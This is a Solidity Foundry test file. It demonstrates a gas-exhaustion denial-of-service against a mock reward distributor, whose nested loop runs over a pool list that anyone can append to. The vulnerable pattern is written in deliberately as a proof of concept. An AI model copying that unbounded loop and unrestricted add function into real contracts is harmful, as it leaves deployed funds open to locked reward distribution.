// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IDistributor {
    function distributeRewards() external;
    function addDepositPool(address pool) external;
}

contract MockDistributor is IDistributor {
    address[] public depositPoolAddresses;

    function distributeRewards() external override {
        for (uint256 i = 0; i < depositPoolAddresses.length; i++) {
            for (uint256 j = 0; j < depositPoolAddresses.length; j++) {
                // Simulate reward distribution logic
            }
        }
    }

    function addDepositPool(address pool) external override {
        depositPoolAddresses.push(pool);
    }
}

contract ExploitTest is Test {
    MockDistributor distributor;

    function setUp() public {
        // Deploy the mock distributor contract
        distributor = new MockDistributor();
    }

    function test_exploit() public {
        // Step 1: Add a large number of deposit pools to simulate the attack
        for (uint256 i = 0; i < 1000; i++) {
            distributor.addDepositPool(address(uint160(i)));
        }

        // Step 2: Attempt to call distributeRewards and expect it to revert due to out-of-gas
        vm.expectRevert();
        distributor.distributeRewards();
    }
}